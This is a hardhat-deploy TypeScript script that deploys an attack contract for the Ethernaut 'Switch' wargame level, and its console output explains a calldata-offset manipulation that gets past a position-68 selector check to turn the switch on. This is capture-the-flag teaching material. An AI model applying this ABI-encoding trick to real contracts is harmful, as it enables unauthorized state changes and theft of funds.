import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";
import { isLocalNetwork } from "../utils/network-config";

/**
 * Deploys the SwitchAttack solution for Ethernaut level 29
 * 
 * To deploy with a specific Switch address:
 * SWITCH_ADDRESS=0xYourAddress npx hardhat deploy --tags switch-solution --network sepolia
 *
 * @param hre HardhatRuntimeEnvironment object
 */
const deploySwitchSolution: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployments, getNamedAccounts, network, run, ethers } = hre;
  const { deploy } = deployments;
  const { deployer } = await getNamedAccounts();
  const chainId = network.config.chainId || 31337;

  console.log("Deploying SwitchAttack solution contract with account:", deployer);

  // Get Switch address from environment or from previous deployment
  let switchAddress = process.env.SWITCH_ADDRESS;

  if (!switchAddress) {
    console.log("SWITCH_ADDRESS not provided, fetching from deployments...");
    
    const switchDeployment = await deployments.getOrNull("Switch");

    if (switchDeployment) {
      switchAddress = switchDeployment.address;
      console.log(`  Switch: ${switchAddress}`);
    } else {
      throw new Error("Please provide SWITCH_ADDRESS environment variable or deploy the instance contract first");
    }
  }

  // Deploy the SwitchAttack contract
  const attackContract = await deploy("SwitchAttack", {
    from: deployer,
    args: [switchAddress],
    log: true,
    autoMine: true,
    waitConfirmations: !isLocalNetwork(chainId) ? 5 : 0,
  });

  console.log("SwitchAttack deployed to:", attackContract.address);
  console.log("  Target Switch:", switchAddress);

  // Get contract instances to display current state
  const switchContract = await ethers.getContractAt("Switch", switchAddress);
  const attackContractInstance = await ethers.getContractAt("SwitchAttack", attackContract.address);
  
  const switchOn = await switchContract.switchOn();
  const selectors = await attackContractInstance.getSelectors();

  console.log("\n=== Current State ===");
  console.log(`Switch: ${switchAddress}`);
  console.log(`Switch On: ${switchOn}`);
  console.log(`Attack Contract: ${attackContract.address}`);

  console.log("\n=== Function Selectors ===");
  console.log(`flipSwitch(bytes): ${selectors.flipSwitch}`);
  console.log(`turnSwitchOn(): ${selectors.turnOn}`);
  console.log(`turnSwitchOff(): ${selectors.turnOff}`);

  console.log("\n=== Attack Strategy ===");
  console.log("The exploit requires manipulating calldata encoding:");
  console.log("");
  console.log("1. Normal calldata for flipSwitch(turnSwitchOff()):");
  console.log("   0x30c13ade (flipSwitch)");
  console.log("   0x0000...0020 (offset = 32)");
  console.log("   0x0000...0004 (length = 4)");
  console.log("   0x20606e15 (turnSwitchOff at position 68)");
  console.log("");
  console.log("2. Malicious calldata for our attack:");
  console.log("   0x30c13ade (flipSwitch)");
  console.log("   0x0000...0060 (offset = 96, not 32!)");
  console.log("   0x0000...0000 (dummy padding)");
  console.log("   0x20606e15 (turnSwitchOff at position 68 - PASSES CHECK!)");
  console.log("   0x0000...0000 (more padding)");
  console.log("   0x0000...0004 (length = 4)");
  console.log("   0x76227e12 (turnSwitchOn at position 96 - ACTUAL DATA!)");
  console.log("");
  console.log("Result:");
  console.log("  - Modifier checks position 68: finds turnSwitchOff ✓");
  console.log("  - flipSwitch reads from offset 96: finds turnSwitchOn ✓");
  console.log("  - Switch gets turned ON! ✓");

  // Verify the contract on non-local networks
  if (!isLocalNetwork(chainId) && process.env.ETHERSCAN_API_KEY) {
    console.log("\nWaiting for blockchain indexers to catch up...");
    await new Promise(resolve => setTimeout(resolve, 60000)); // 60 seconds delay
    
    console.log("Verifying SwitchAttack contract on Etherscan...");
    try {
      await run("verify:verify", {
        address: attackContract.address,
        constructorArguments: [switchAddress],
      });
      console.log("Contract verification successful!");
    } catch (error: any) {
      if (error.message.includes("Already Verified")) {
        console.log("Contract is already verified!");
      } else if (error.message.includes("does not have bytecode")) {
        console.log("Verification failed: Contract bytecode not found on the explorer yet.");
        console.log("You can manually verify later.");
      } else {
        console.error("Verification failed:", error);
      }
    }
  }
  
  console.log("\n----------------------------------------------------");
  console.log("📝 Next Steps:");
  console.log("1. Execute the attack using:");
  console.log(`   ATTACK_CONTRACT_ADDRESS=${attackContract.address} TARGET_ADDRESS=${switchAddress} npx hardhat run scripts/level-29-switch/attack.ts --network ${network.name}`);
  console.log("\n2. This will craft malicious calldata to flip the switch!");
  console.log("----------------------------------------------------");
};

export default deploySwitchSolution;

// Tags help to select which deploy script to run
deploySwitchSolution.tags = ["level-29", "switch-solution"];

// Only add dependency if we're not using provided address
if (!process.env.SWITCH_ADDRESS) {
  // This script depends on the Switch contract being deployed first
  deploySwitchSolution.dependencies = ["switch"];
}
